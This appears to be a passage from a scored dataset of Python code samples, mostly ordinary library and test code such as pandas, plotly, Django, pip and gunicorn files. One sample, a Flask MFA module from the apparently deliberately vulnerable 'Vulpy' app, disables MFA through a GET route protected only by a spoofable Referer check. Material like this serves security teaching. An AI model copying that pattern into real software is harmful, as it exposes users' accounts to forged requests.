foo,2,3,4,5
bar,7,8,9,10
baz,12,13,14,15
qux,12,13,14,15
foo2,12,13,14,15
bar2,12,13,14,15
""""""
    parser = all_parsers
    kwargs = {""index_col"": 0}

    lines = list(csv.reader(StringIO(data)))
    with TextParser(lines, chunksize=2, skiprows=[1], **kwargs) as reader:
        chunks = list(reader)

    expected = parser.read_csv(StringIO(data), **kwargs)

    tm.assert_frame_equal(chunks[0], expected[1:3])


def test_read_csv_parse_simple_list(all_parsers):
    parser = all_parsers
    data = """"""foo
bar baz
qux foo
foo
bar""""""

    result = parser.read_csv(StringIO(data), header=None)
    expected = DataFrame([""foo"", ""bar baz"", ""qux foo"", ""foo"", ""bar""])
    tm.assert_frame_equal(result, expected)"
35	adjudicated	2	"import _plotly_utils.basevalidators


class HoverlabelValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""hoverlabel"", parent_name=""cone"", **kwargs):
        super(HoverlabelValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Hoverlabel""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            align
                Sets the horizontal alignment of the text
                content within hover label box. Has an effect
                only if the hover label text spans more two or
                more lines
            alignsrc
                Sets the source reference on Chart Studio Cloud
                for `align`.
            bgcolor
                Sets the background color of the hover labels
                for this trace
            bgcolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bgcolor`.
            bordercolor
                Sets the border color of the hover labels for
                this trace.
            bordercolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bordercolor`.
            font
                Sets the font used in hover labels.
            namelength
                Sets the default length (in number of
                characters) of the trace name in the hover
                labels for all traces. -1 shows the whole name
                regardless of length. 0-3 shows the first 0-3
                characters, and an integer >3 will show the
                whole name if it is less than that many
                characters, but if it is longer, will truncate
                to `namelength - 3` characters and add an
                ellipsis.
            namelengthsrc
                Sets the source reference on Chart Studio Cloud
                for `namelength`.
"""""",
            ),
            **kwargs,
        )"
124	adjudicated	2	"import _plotly_utils.basevalidators


class CumulativeValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""cumulative"", parent_name=""histogram"", **kwargs):
        super(CumulativeValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Cumulative""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            currentbin
                Only applies if cumulative is enabled. Sets
                whether the current bin is included, excluded,
                or has half of its value included in the
                current cumulative value. ""include"" is the
                default for compatibility with various other
                tools, however it introduces a half-bin bias to
                the results. ""exclude"" makes the opposite half-
                bin bias, and ""half"" removes it.
            direction
                Only applies if cumulative is enabled. If
                ""increasing"" (default) we sum all prior bins,
                so the result increases from left to right. If
                ""decreasing"" we sum later bins so the result
                decreases from left to right.
            enabled
                If true, display the cumulative distribution by
                summing the binned values. Use the `direction`
                and `centralbin` attributes to tune the
                accumulation method. Note: in this mode, the
                ""density"" `histnorm` settings behave the same
                as their equivalents without ""density"": """" and
                ""density"" both rise to the number of data
                points, and ""probability"" and *probability
                density* both rise to the number of sample
                points.
"""""",
            ),
            **kwargs,
        )"
64	adjudicated	0	"import unittest

from Cython import StringIOTree as stringtree

code = """"""
cdef int spam                   # line 1

cdef ham():
    a = 1
    b = 2
    c = 3
    d = 4

def eggs():
    pass

cpdef bacon():
    print spam
    print 'scotch'
    print 'tea?'
    print 'or coffee?'          # line 16
""""""

linemap = dict(enumerate(code.splitlines()))

class TestStringIOTree(unittest.TestCase):

    def setUp(self):
        self.tree = stringtree.StringIOTree()

    def test_markers(self):
        assert not self.tree.allmarkers()

    def test_insertion(self):
        self.write_lines((1, 2, 3))
        line_4_to_6_insertion_point = self.tree.insertion_point()
        self.write_lines((7, 8))
        line_9_to_13_insertion_point = self.tree.insertion_point()
        self.write_lines((14, 15, 16))

        line_4_insertion_point = line_4_to_6_insertion_point.insertion_point()
        self.write_lines((5, 6), tree=line_4_to_6_insertion_point)

        line_9_to_12_insertion_point = (
            line_9_to_13_insertion_point.insertion_point())
        self.write_line(13, tree=line_9_to_13_insertion_point)

        self.write_line(4, tree=line_4_insertion_point)
        self.write_line(9, tree=line_9_to_12_insertion_point)
        line_10_insertion_point = line_9_to_12_insertion_point.insertion_point()
        self.write_line(11, tree=line_9_to_12_insertion_point)
        self.write_line(10, tree=line_10_insertion_point)
        self.write_line(12, tree=line_9_to_12_insertion_point)

        self.assertEqual(self.tree.allmarkers(), list(range(1, 17)))
        self.assertEqual(code.strip(), self.tree.getvalue().strip())


    def write_lines(self, linenos, tree=None):
        for lineno in linenos:
            self.write_line(lineno, tree=tree)

    def write_line(self, lineno, tree=None):
        if tree is None:
            tree = self.tree
        tree.markers.append(lineno)
        tree.write(linemap[lineno] + '\n')"
246	adjudicated	2	"# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

# [START job_search_autocomplete_job_title]

from google.cloud import talent_v4beta1
import six


def complete_query(project_id, tenant_id, query):
    """"""Complete job title given partial text (autocomplete)""""""

    client = talent_v4beta1.CompletionClient()

    # project_id = 'Your Google Cloud Project ID'
    # tenant_id = 'Your Tenant ID (using tenancy is optional)'
    # query = '[partially typed job title]'

    if isinstance(project_id, six.binary_type):
        project_id = project_id.decode(""utf-8"")
    if isinstance(tenant_id, six.binary_type):
        tenant_id = tenant_id.decode(""utf-8"")
    if isinstance(query, six.binary_type):
        query = query.decode(""utf-8"")

    parent = f""projects/{project_id}/tenants/{tenant_id}""

    request = talent_v4beta1.CompleteQueryRequest(
        parent=parent,
        query=query,
        page_size=5,  # limit for number of results
        language_codes=[""en-US""],  # language code
    )
    response = client.complete_query(request=request)
    for result in response.completion_results:
        print(f""Suggested title: {result.suggestion}"")
        # Suggestion type is JOB_TITLE or COMPANY_TITLE
        print(
            f""Suggestion type: {talent_v4beta1.CompleteQueryRequest.CompletionType(result.type_).name}""
        )


# [END job_search_autocomplete_job_title]"
97	adjudicated	0	"import sqlite3
from flask import Blueprint, render_template, redirect, request, g, session, make_response, flash
import libuser
import libsession
import libmfa
import pyotp
import qrcode
import base64
from io import BytesIO


mod_mfa = Blueprint('mod_mfa', __name__, template_folder='templates')


@mod_mfa.route('/', methods=['GET'])
def do_mfa_view():

    if 'username' not in g.session:
        return redirect('/user/login')

    if libmfa.mfa_is_enabled(g.session['username']):
        return render_template('mfa.disable.html')
    else:
        libmfa.mfa_reset_secret(g.session['username'])
        secret = libmfa.mfa_get_secret(g.session['username'])
        secret_url = pyotp.totp.TOTP(secret).provisioning_uri(g.session['username'], issuer_name=""Vulpy"")
        img = qrcode.make(secret_url)

        buffered = BytesIO()
        img.save(buffered, format=""PNG"")
        img_str = base64.b64encode(buffered.getvalue()).decode()

        return render_template('mfa.enable.html', secret_url=secret_url, img_str=img_str)


@mod_mfa.route('/', methods=['POST'])
def do_mfa_enable():

    if 'username' not in g.session:
        return redirect('/user/login')

    secret = libmfa.mfa_get_secret(g.session['username'])

    otp = request.form.get('otp')

    totp = pyotp.TOTP(secret)

    if totp.verify(otp):
        libmfa.mfa_enable(g.session['username'])
        return redirect('/mfa/')
    else:
        flash(""The OTP was incorrect"")
        return redirect('/mfa/')

    return render_template('mfa.enable.html')


@mod_mfa.route('/disable', methods=['GET'])
def do_mfa_disable():

    if 'username' not in g.session:
        return redirect('/user/login')

    if 'referer' not in request.headers or request.headers['referer'] != 'vulpy.com':
        return redirect('/user/login')

    libmfa.mfa_disable(g.session['username'])
    return redirect('/mfa/')
"
306	adjudicated	2	"from . import engines
from .exceptions import TemplateDoesNotExist


def get_template(template_name, using=None):
    """"""
    Load and return a template for the given name.

    Raise TemplateDoesNotExist if no such template exists.
    """"""
    chain = []
    engines = _engine_list(using)
    for engine in engines:
        try:
            return engine.get_template(template_name)
        except TemplateDoesNotExist as e:
            chain.append(e)

    raise TemplateDoesNotExist(template_name, chain=chain)


def select_template(template_name_list, using=None):
    """"""
    Load and return a template for one of the given names.

    Try names in order and return the first template found.

    Raise TemplateDoesNotExist if no such template exists.
    """"""
    if isinstance(template_name_list, str):
        raise TypeError(
            ""select_template() takes an iterable of template names but got a ""
            ""string: %r. Use get_template() if you want to load a single ""
            ""template by name."" % template_name_list
        )

    chain = []
    engines = _engine_list(using)
    for template_name in template_name_list:
        for engine in engines:
            try:
                return engine.get_template(template_name)
            except TemplateDoesNotExist as e:
                chain.append(e)

    if template_name_list:
        raise TemplateDoesNotExist("", "".join(template_name_list), chain=chain)
    else:
        raise TemplateDoesNotExist(""No template names provided"")


def render_to_string(template_name, context=None, request=None, using=None):
    """"""
    Load a template and render it with a context. Return a string.

    template_name may be a string or a list of strings.
    """"""
    if isinstance(template_name, (list, tuple)):
        template = select_template(template_name, using=using)
    else:
        template = get_template(template_name, using=using)
    return template.render(context, request)


def _engine_list(using=None):
    return engines.all() if using is None else [engines[using]]"
186	adjudicated	4	"import functools
import logging
import re
from typing import NewType, Optional, Tuple, cast

from pip._vendor.packaging import specifiers, version
from pip._vendor.packaging.requirements import Requirement

NormalizedExtra = NewType(""NormalizedExtra"", str)

logger = logging.getLogger(__name__)


def check_requires_python(
    requires_python: Optional[str], version_info: Tuple[int, ...]
) -> bool:
    """"""
    Check if the given Python version matches a ""Requires-Python"" specifier.

    :param version_info: A 3-tuple of ints representing a Python
        major-minor-micro version to check (e.g. `sys.version_info[:3]`).

    :return: `True` if the given Python version satisfies the requirement.
        Otherwise, return `False`.

    :raises InvalidSpecifier: If `requires_python` has an invalid format.
    """"""
    if requires_python is None:
        # The package provides no information
        return True
    requires_python_specifier = specifiers.SpecifierSet(requires_python)

    python_version = version.parse(""."".join(map(str, version_info)))
    return python_version in requires_python_specifier


@functools.lru_cache(maxsize=512)
def get_requirement(req_string: str) -> Requirement:
    """"""Construct a packaging.Requirement object with caching""""""
    # Parsing requirement strings is expensive, and is also expected to happen
    # with a low diversity of different arguments (at least relative the number
    # constructed). This method adds a cache to requirement object creation to
    # minimize repeated parsing of the same string to construct equivalent
    # Requirement objects.
    return Requirement(req_string)


def safe_extra(extra: str) -> NormalizedExtra:
    """"""Convert an arbitrary string to a standard 'extra' name

    Any runs of non-alphanumeric characters are replaced with a single '_',
    and the result is always lowercased.

    This function is duplicated from ``pkg_resources``. Note that this is not
    the same to either ``canonicalize_name`` or ``_egg_link_name``.
    """"""
    return cast(NormalizedExtra, re.sub(""[^A-Za-z0-9.-]+"", ""_"", extra).lower())"
357	adjudicated	0	"from typing import List
from collections import deque

class Solution:
    def maxAreaofIsland(self, grid: List[List[int]]) -> int:
        row = len(grid)
        col = len(grid[0])
        biggest_island = 0
        visited = [[False for i in range(col)] for j in range(row)]
        for i in range(row):
            for j in range(col):
                if grid[i][j] == 1 and visited[i][j] is False:
                    island_area = self.visitIsland(grid, visited, i,j)
                    biggest_island = max(island_area,biggest_island)
        return biggest_island

    def visitIsland(self, grid: List[List[int]], visited: List[List[int]], i: int, j: int) -> int:
        neighbours = deque([(i,j)])
        area = 0
        while neighbours:
            row,col = neighbours.popleft()
            if row < 0 or row >= len(grid) or col < 0 or col >= len(grid[0]):
                continue
            if visited[row][col] is False and grid[row][col] == 1:
                visited[row][col] = True
                area += 1
                neighbours.extend([(row + 1,col)])
                neighbours.extend([(row - 1, col)])
                neighbours.extend([(row, col + 1)])
                neighbours.extend([(row, col - 1)])
        return area

if __name__ == '__main__':
    solution = Solution()
    case1 = [[0,0,0,0,0,0,0,0]]
    assert solution.maxAreaofIsland(case1) == 0

    case2 = [[0,0,1,0,0,0,0,1,0,0,0,0,0],[0,0,0,0,0,0,0,1,1,1,0,0,0],[0,1,1,0,1,0,0,0,0,0,0,0,0],[0,1,0,0,1,1,0,0,1,0,1,0,0],
             [0,1,0,0,1,1,0,0,1,1,1,0,0],[0,0,0,0,0,0,0,0,0,0,1,0,0],[0,0,0,0,0,0,0,1,1,1,0,0,0],[0,0,0,0,0,0,0,1,1,0,0,0,0]]
    assert solution.maxAreaofIsland(case2) == 6

    case3 = [[1, 1, 1, 0, 0], [0, 1, 0, 0, 1], [0, 0, 1, 1, 0], [0, 1, 1, 0, 0], [0, 0, 1, 0, 0]]

    assert solution.maxAreaofIsland(case3) == 5"
419	adjudicated	2	"import _plotly_utils.basevalidators


class InsidetextfontValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""insidetextfont"", parent_name=""pie"", **kwargs):
        super(InsidetextfontValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Insidetextfont""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            color

            colorsrc
                Sets the source reference on Chart Studio Cloud
                for `color`.
            family
                HTML font family - the typeface that will be
                applied by the web browser. The web browser
                will only be able to apply a font if it is
                available on the system which it operates.
                Provide multiple font families, separated by
                commas, to indicate the preference in which to
                apply fonts if they aren't available on the
                system. The Chart Studio Cloud (at
                https://chart-studio.plotly.com or on-premise)
                generates images on a server, where only a
                select number of fonts are installed and
                supported. These include ""Arial"", ""Balto"",
                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",
                ""Droid Sans Mono"", ""Gravitas One"", ""Old
                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans
                Narrow"", ""Raleway"", ""Times New Roman"".
            familysrc
                Sets the source reference on Chart Studio Cloud
                for `family`.
            size

            sizesrc
                Sets the source reference on Chart Studio Cloud
                for `size`.
"""""",
            ),
            **kwargs,
        )"
508	adjudicated	1	"#
# Copyright 2018 the original author or authors.
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
from google.protobuf.json_format import MessageToDict
from google.protobuf.message import Message
from simplejson import dumps
from common.event_bus import EventBusClient
from voltha.protos.omci_mib_db_pb2 import OpenOmciEvent
from voltha.protos.omci_alarm_db_pb2 import AlarmOpenOmciEvent
from common.utils.json_format import MessageToDict


class OpenOmciEventBus(object):
    """""" Event bus for publishing OpenOMCI related events. """"""
    __slots__ = (
        '_event_bus_client',  # The event bus client used to publish events.
        '_topic'              # the topic to publish to
    )

    def __init__(self):
        self._event_bus_client = EventBusClient()
        self._topic = 'openomci-events'

    def message_to_dict(m):
        return MessageToDict(m, True, True, False)

    def advertise(self, event_type, data):
        if isinstance(data, Message):
            msg = dumps(MessageToDict(data, True, True))
        elif isinstance(data, dict):
            msg = dumps(data)
        else:
            msg = str(data)

        event_func = AlarmOpenOmciEvent if 'AlarmSynchronizer' in msg \
                                  else OpenOmciEvent
        event = event_func(
                type=event_type,
                data=msg
        )

        self._event_bus_client.publish(self._topic, event)"
448	adjudicated	1	"# -*- coding: utf-8 -
#
# This file is part of gunicorn released under the MIT license.
# See the NOTICE for more information.

import os

from gunicorn.errors import ConfigError
from gunicorn.app.base import Application
from gunicorn import util


class WSGIApplication(Application):
    def init(self, parser, opts, args):
        self.app_uri = None

        if opts.paste:
            from .pasterapp import has_logging_config

            config_uri = os.path.abspath(opts.paste)
            config_file = config_uri.split('#')[0]

            if not os.path.exists(config_file):
                raise ConfigError(""%r not found"" % config_file)

            self.cfg.set(""default_proc_name"", config_file)
            self.app_uri = config_uri

            if has_logging_config(config_file):
                self.cfg.set(""logconfig"", config_file)

            return

        if len(args) > 0:
            self.cfg.set(""default_proc_name"", args[0])
            self.app_uri = args[0]

    def load_config(self):
        super().load_config()

        if self.app_uri is None:
            if self.cfg.wsgi_app is not None:
                self.app_uri = self.cfg.wsgi_app
            else:
                raise ConfigError(""No application module specified."")

    def load_wsgiapp(self):
        return util.import_app(self.app_uri)

    def load_pasteapp(self):
        from .pasterapp import get_wsgi_app
        return get_wsgi_app(self.app_uri, defaults=self.cfg.paste_global_conf)

    def load(self):
        if self.cfg.paste is not None:
            return self.load_pasteapp()
        else:
            return self.load_wsgiapp()


def run():
    """"""\
    The ``gunicorn`` command line runner for launching Gunicorn with
    generic WSGI applications.
    """"""
    from gunicorn.app.wsgiapp import WSGIApplication
    WSGIApplication(""%(prog)s [OPTIONS] [APP_MODULE]"").run()


if __name__ == '__main__':
    run()"
458	adjudicated	2	"# This file is part of Scapy
# See http://www.secdev.org/projects/scapy for more information
# Copyright (C) Philippe Biondi <phil@secdev.org>
# This program is published under a GPLv2 license

""""""
External link to programs
""""""

import os
import subprocess
from scapy.error import log_loading

# Notice: this file must not be called before main.py, if started
# in interactive mode, because it needs to be called after the
# logger has been setup, to be able to print the warning messages

# MATPLOTLIB

try:
    from matplotlib import get_backend as matplotlib_get_backend
    from matplotlib import pyplot as plt
    from matplotlib.lines import Line2D
    MATPLOTLIB = 1
    if ""inline"" in matplotlib_get_backend():
        MATPLOTLIB_INLINED = 1
    else:
        MATPLOTLIB_INLINED = 0
    MATPLOTLIB_DEFAULT_PLOT_KARGS = {""marker"": ""+""}
# RuntimeError to catch gtk ""Cannot open display"" error
except (ImportError, RuntimeError):
    plt = None
    Line2D = None
    MATPLOTLIB = 0
    MATPLOTLIB_INLINED = 0
    MATPLOTLIB_DEFAULT_PLOT_KARGS = dict()
    log_loading.info(""Can't import matplotlib. Won't be able to plot."")

# PYX


def _test_pyx():
    # type: () -> bool
    """"""Returns if PyX is correctly installed or not""""""
    try:
        with open(os.devnull, 'wb') as devnull:
            r = subprocess.check_call([""pdflatex"", ""--version""],
                                      stdout=devnull, stderr=subprocess.STDOUT)
    except (subprocess.CalledProcessError, OSError):
        return False
    else:
        return r == 0


try:
    import pyx  # noqa: F401
    if _test_pyx():
        PYX = 1
    else:
        log_loading.info(""PyX dependencies are not installed ! Please install TexLive or MikTeX."")  # noqa: E501
        PYX = 0
except ImportError:
    log_loading.info(""Can't import PyX. Won't be able to use psdump() or pdfdump()."")  # noqa: E501
    PYX = 0"
409	adjudicated	2	"import os
import json

import torch
from PIL import Image
from torchvision import transforms
import matplotlib.pyplot as plt

from vit_model import vit_base_patch16_224_in21k as create_model


def main():
    device = torch.device(""cuda:0"" if torch.cuda.is_available() else ""cpu"")

    data_transform = transforms.Compose(
        [transforms.Resize(256),
         transforms.CenterCrop(224),
         transforms.ToTensor(),
         transforms.Normalize([0.5, 0.5, 0.5], [0.5, 0.5, 0.5])])

    # load image
    img_path = ""../tulip.jpg""
    assert os.path.exists(img_path), ""file: '{}' dose not exist."".format(img_path)
    img = Image.open(img_path)
    plt.imshow(img)
    # [N, C, H, W]
    img = data_transform(img)
    # expand batch dimension
    img = torch.unsqueeze(img, dim=0)

    # read class_indict
    json_path = './class_indices.json'
    assert os.path.exists(json_path), ""file: '{}' dose not exist."".format(json_path)

    with open(json_path, ""r"") as f:
        class_indict = json.load(f)

    # create model
    model = create_model(num_classes=5, has_logits=False).to(device)
    # load model weights
    model_weight_path = ""./weights/model-9.pth""
    model.load_state_dict(torch.load(model_weight_path, map_location=device))
    model.eval()
    with torch.no_grad():
        # predict class
        output = torch.squeeze(model(img.to(device))).cpu()
        predict = torch.softmax(output, dim=0)
        predict_cla = torch.argmax(predict).numpy()

    print_res = ""class: {}   prob: {:.3}"".format(class_indict[str(predict_cla)],
                                                 predict[predict_cla].numpy())
    plt.title(print_res)
    for i in range(len(predict)):
        print(""class: {:10}   prob: {:.3}"".format(class_indict[str(i)],
                                                  predict[i].numpy()))
    plt.show()


if __name__ == '__main__':
    main()"
347	adjudicated	0	"from functools import partial

import pytest

from ..argument import Argument, to_arguments
from ..field import Field
from ..inputfield import InputField
from ..scalars import String
from ..structures import NonNull


def test_argument():
    arg = Argument(String, default_value=""a"", description=""desc"", name=""b"")
    assert arg.type == String
    assert arg.default_value == ""a""
    assert arg.description == ""desc""
    assert arg.name == ""b""


def test_argument_comparasion():
    arg1 = Argument(String, name=""Hey"", description=""Desc"", default_value=""default"")
    arg2 = Argument(String, name=""Hey"", description=""Desc"", default_value=""default"")

    assert arg1 == arg2
    assert arg1 != String()


def test_argument_required():
    arg = Argument(String, required=True)
    assert arg.type == NonNull(String)


def test_to_arguments():
    args = {""arg_string"": Argument(String), ""unmounted_arg"": String(required=True)}

    my_args = to_arguments(args)
    assert my_args == {
        ""arg_string"": Argument(String),
        ""unmounted_arg"": Argument(String, required=True),
    }


def test_to_arguments_raises_if_field():
    args = {""arg_string"": Field(String)}

    with pytest.raises(ValueError) as exc_info:
        to_arguments(args)

    assert str(exc_info.value) == (
        ""Expected arg_string to be Argument, but received Field. Try using ""
        ""Argument(String).""
    )


def test_to_arguments_raises_if_inputfield():
    args = {""arg_string"": InputField(String)}

    with pytest.raises(ValueError) as exc_info:
        to_arguments(args)

    assert str(exc_info.value) == (
        ""Expected arg_string to be Argument, but received InputField. Try ""
        ""using Argument(String).""
    )


def test_argument_with_lazy_type():
    MyType = object()
    arg = Argument(lambda: MyType)
    assert arg.type == MyType


def test_argument_with_lazy_partial_type():
    MyType = object()
    arg = Argument(partial(lambda: MyType))
    assert arg.type == MyType"
207	adjudicated	3	"###############################################################################
#
# The MIT License (MIT)
#
# Copyright (c) typedef int GmbH
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the ""Software""), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in
# all copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
# THE SOFTWARE.
#
###############################################################################

import platform

import autobahn

# WebSocket protocol support
from autobahn.asyncio.websocket import \
    WebSocketServerProtocol, \
    WebSocketClientProtocol, \
    WebSocketServerFactory, \
    WebSocketClientFactory

# WAMP support
from autobahn.asyncio.wamp import ApplicationSession


__all__ = (
    'WebSocketServerProtocol',
    'WebSocketClientProtocol',
    'WebSocketServerFactory',
    'WebSocketClientFactory',
    'ApplicationSession',
)

__ident__ = 'Autobahn/{}-asyncio-{}/{}'.format(autobahn.__version__, platform.python_implementation(), platform.python_version())
""""""
AutobahnPython library implementation (eg. ""Autobahn/0.13.0-asyncio-CPython/3.5.1"")
"""""""
196	adjudicated	3	"""""""
    pygments.styles.perldoc
    ~~~~~~~~~~~~~~~~~~~~~~~

    Style similar to the style used in the `perldoc`_ code blocks.

    .. _perldoc: http://perldoc.perl.org/

    :copyright: Copyright 2006-2022 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.
""""""

from pygments.style import Style
from pygments.token import Keyword, Name, Comment, String, Error, \
     Number, Operator, Generic, Whitespace


class PerldocStyle(Style):
    """"""
    Style similar to the style used in the perldoc code blocks.
    """"""

    background_color = '#eeeedd'

    styles = {
        Whitespace:             '#bbbbbb',
        Comment:                '#228B22',
        Comment.Preproc:        '#1e889b',
        Comment.Special:        '#8B008B bold',

        String:                 '#CD5555',
        String.Heredoc:         '#1c7e71 italic',
        String.Regex:           '#B452CD',
        String.Other:           '#cb6c20',
        String.Regex:           '#1c7e71',

        Number:                 '#B452CD',

        Operator.Word:          '#8B008B',

        Keyword:                '#8B008B bold',
        Keyword.Type:           '#00688B',

        Name.Class:             '#008b45 bold',
        Name.Exception:         '#008b45 bold',
        Name.Function:          '#008b45',
        Name.Namespace:         '#008b45 underline',
        Name.Variable:          '#00688B',
        Name.Constant:          '#00688B',
        Name.Decorator:         '#707a7c',
        Name.Tag:               '#8B008B bold',
        Name.Attribute:         '#658b00',
        Name.Builtin:           '#658b00',

        Generic.Heading:        'bold #000080',
        Generic.Subheading:     'bold #800080',
        Generic.Deleted:        '#aa0000',
        Generic.Inserted:       '#00aa00',
        Generic.Error:          '#aa0000',
        Generic.Emph:           'italic',
        Generic.Strong:         'bold',
        Generic.Prompt:         '#555555',
        Generic.Output:         '#888888',
        Generic.Traceback:      '#aa0000',

        Error:                  'bg:#e3d2d2 #a61717'
    }"
316	adjudicated	3	"import numpy as np
import numba

# - plotStratigraphy takes 1) XorY_StratiOverTime (time and either x or y dimensions): strati__elevation selected for only the basin area and either averaged or selected for one across (y)/down(x) basin distance 
#     2) XorY_GrainSizeOverTime (time and either x or y dimensions) the grain size or erosion rate or other desired variable that will be used to fill the stratigraphy. This also needs to be selected or averaged for one x/y distance. 
# - stratigraphy as it is written assumes that channels are draining either in the x or y direction (mountain along one axis) and stratigraphy is generated along one axis.     
# - plotStratigraphy averages the nearby nodes (grain size or erosion rate or other desired value passed) to fill a given cell of stratigraphy.
# -plotStraigraphy2 does not average the nearest nodes and takes the first closest value to fill the stratigraphy. 

@numba.njit
def plotStratigraphy(XorY_StratiOverTime,XorY_GrainSizeOverTime):
    i=0
    j=0
    C=np.zeros(((XorY_StratiOverTime.shape[0]),(XorY_StratiOverTime.shape[1])))
    for i in range(0,(XorY_StratiOverTime.shape[1])):
        for j in range(0,(XorY_StratiOverTime.shape[0])):
            tryff=np.array([XorY_GrainSizeOverTime[j,i],XorY_GrainSizeOverTime[j,i+1],XorY_GrainSizeOverTime[j+1,i],XorY_GrainSizeOverTime[j+1,i+1]])
            C[j,i]=np.nanmean(tryff)
    return C

@numba.njit
def plotStratigraphy2(XorY_StratiOverTime,XorY_GrainSizeOverTime):
    i=0
    j=0
    C=np.zeros(((XorY_StratiOverTime.shape[0]),(XorY_StratiOverTime.shape[1])))
    for i in range(0,(XorY_StratiOverTime.shape[1])):
        for j in range(0,(XorY_StratiOverTime.shape[0])):
            #tryff=np.array([XorY_GrainSizeOverTime[j,i],XorY_GrainSizeOverTime[j,i+1],XorY_GrainSizeOverTime[j+1,i],XorY_GrainSizeOverTime[j+1,i+1]])
            C[j,i]=(XorY_GrainSizeOverTime[j,i])
    return C"
87	adjudicated	0	"import threading

from pydantic import BaseModel

from prowler.lib.logger import logger
from prowler.providers.aws.aws_provider import generate_regional_clients


################## SecretsManager
class SecretsManager:
    def __init__(self, audit_info):
        self.service = ""secretsmanager""
        self.session = audit_info.audit_session
        self.audited_account = audit_info.audited_account
        self.regional_clients = generate_regional_clients(self.service, audit_info)
        self.secrets = {}
        self.__threading_call__(self.__list_secrets__)

    def __get_session__(self):
        return self.session

    def __threading_call__(self, call):
        threads = []
        for regional_client in self.regional_clients.values():
            threads.append(threading.Thread(target=call, args=(regional_client,)))
        for t in threads:
            t.start()
        for t in threads:
            t.join()

    def __list_secrets__(self, regional_client):
        logger.info(""SecretsManager - Listing Secrets..."")
        try:
            list_secrets_paginator = regional_client.get_paginator(""list_secrets"")
            for page in list_secrets_paginator.paginate():
                for secret in page[""SecretList""]:
                    self.secrets[secret[""Name""]] = Secret(
                        arn=secret[""ARN""],
                        name=secret[""Name""],
                        region=regional_client.region,
                    )
                    if ""RotationEnabled"" in secret:
                        self.secrets[secret[""Name""]].rotation_enabled = secret[
                            ""RotationEnabled""
                        ]

        except Exception as error:
            logger.error(
                f""{regional_client.region} --""
                f"" {error.__class__.__name__}[{error.__traceback__.tb_lineno}]:""
                f"" {error}""
            )


class Secret(BaseModel):
    arn: str
    name: str
    region: str
    rotation_enabled: bool = False"
256	adjudicated	1	"import win32api, win32security
import win32con, ntsecuritycon, winnt
import os

temp_dir = win32api.GetTempPath()
fname = win32api.GetTempFileName(temp_dir, ""rsk"")[0]
print(fname)
## file can't exist
os.remove(fname)

## enable backup and restore privs
required_privs = (
    (
        win32security.LookupPrivilegeValue("""", ntsecuritycon.SE_BACKUP_NAME),
        win32con.SE_PRIVILEGE_ENABLED,
    ),
    (
        win32security.LookupPrivilegeValue("""", ntsecuritycon.SE_RESTORE_NAME),
        win32con.SE_PRIVILEGE_ENABLED,
    ),
)
ph = win32api.GetCurrentProcess()
th = win32security.OpenProcessToken(
    ph, win32con.TOKEN_READ | win32con.TOKEN_ADJUST_PRIVILEGES
)
adjusted_privs = win32security.AdjustTokenPrivileges(th, 0, required_privs)

try:
    sa = win32security.SECURITY_ATTRIBUTES()
    my_sid = win32security.GetTokenInformation(th, ntsecuritycon.TokenUser)[0]
    sa.SECURITY_DESCRIPTOR.SetSecurityDescriptorOwner(my_sid, 0)

    k, disp = win32api.RegCreateKeyEx(
        win32con.HKEY_CURRENT_USER,
        ""Python test key"",
        SecurityAttributes=sa,
        samDesired=win32con.KEY_ALL_ACCESS,
        Class=""some class"",
        Options=0,
    )
    win32api.RegSetValue(k, None, win32con.REG_SZ, ""Default value for python test key"")

    subk, disp = win32api.RegCreateKeyEx(
        k,
        ""python test subkey"",
        SecurityAttributes=sa,
        samDesired=win32con.KEY_ALL_ACCESS,
        Class=""some other class"",
        Options=0,
    )
    win32api.RegSetValue(subk, None, win32con.REG_SZ, ""Default value for subkey"")

    win32api.RegSaveKeyEx(
